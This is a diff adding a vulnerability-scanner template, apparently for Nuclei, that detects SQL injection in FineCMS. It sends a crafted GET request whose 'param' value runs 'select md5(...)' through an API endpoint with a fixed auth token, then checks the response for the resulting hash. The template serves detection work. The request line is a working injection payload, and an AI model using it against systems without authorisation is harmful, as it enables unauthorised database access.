@@ -1,0 +1,23 @@
+id: finecms-sql-injection
+info:
+  name: FineCMS SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects a SQL Injection vulnerability in FineCMS by checking if a custom MD5 hash is echoed back in the response.
+
+variables:
+  rand: "{{rand_int(200000000, 210000000)}}"
+
+http:
+  - raw:
+      - |
+        GET /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand}})%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
